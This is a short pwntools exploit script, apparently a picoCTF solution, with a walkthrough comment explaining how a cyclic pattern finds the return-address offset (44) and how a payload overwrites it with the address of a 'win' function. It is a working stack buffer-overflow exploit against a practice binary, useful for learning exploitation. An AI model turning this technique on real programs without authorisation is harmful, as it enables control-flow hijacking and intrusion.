from pwn import *

# r = remote('saturn.picoctf.net', 58840)

r = process("./vuln2")
raw_input()

r.recvline()

"""
It gives us:
    Please enter your string: \n
so first, receive a line `r.recvline()`

And we randomly send a long string, for example: cyclic(50)

We want to find $eip (return address),
after sending long string, we got $eip=0x6161616c.

Let's check it, run `pattern search 0x6161616c`,
The output will be like:
    [+] Searching for '6c616161'/'6161616c' with period=4
    [+] Found at offset 44 (little-endian search) likely

Now, we found $eip (ret adr) is in offset 44 place.

So first of all, give our payload length of 44 junk. And,

we have to replace return address with our `win` function.
(address of `win` can be found by `x win` in gdb, or `afl` in radare2)

Since this is a 32-bit executable, use `p32` to prase the address.

Finally, we done!
"""

payload = cyclic(44) + p32(0x080491f6)
r.sendline(payload)

r.interactive()
